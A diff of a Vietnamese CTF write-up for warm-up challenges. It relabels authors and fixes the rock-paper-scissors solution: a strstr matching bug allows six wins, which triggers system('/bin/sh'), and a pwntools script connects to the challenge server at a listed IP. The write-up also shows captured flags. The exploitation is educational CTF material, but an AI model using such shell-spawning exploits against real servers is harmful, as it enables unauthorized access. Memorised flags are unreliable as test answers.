@@ -3,7 +3,7 @@
 # 1. NetCat
 
 ## Category
-Warm Up
+Warm Up - Halston
 
 ## Question
 Can you connect the netcat ? 
@@ -32,7 +32,7 @@ Here your flag: ISPCTF{Th1s_1s_n3t_c4t}
 # 2. abcbof
 
 ## Category
-Warm Up
+Warm Up - Halston
 
 ## Question
 >nc 174.138.21.217 3137
@@ -128,7 +128,7 @@ ISPCTF{B4s1c_Buff3r_0v3rFl0w}
 # 3. RPS
 
 ## Category
-Warm Up
+Warm Up - I1igma
 
 ## Question
 >nc 174.138.21.217 3138
@@ -142,14 +142,22 @@ if (strstr(player_turn, loses[computer_turn])) {
     puts("You win! Play again?");
     return true;
 ```
-Tận dụng lỗi này ta sẽ nhập `{"rock", "paper", "scissors"}` 5 lần để có thể chiến thắng bằng payload
+Tận dụng lỗi này ta sẽ nhập `{"rock", "paper", "scissors"}` 5 lần để có thể chiến thắng bằng cách win 6 lần.
+```
+ if (wins >= 6) {
+        puts("Congrats!!!");
+        system("/bin/sh");
+	
+      }
+```
+Payload khai thác.
 ```
 halston in ~/CTF/miniCTF2022/warmup/RPS λ cat exploit.py
 from pwn import *
 
 p = remote("174.138.21.217", 3138)
 
-for i in range(5):
+for i in range(6):
         p.recvuntil(b"Type '2' to exit the program")
         p.sendline(b"1")
         p.recvuntil(b"Please make your selection (rock/paper/scissors):")
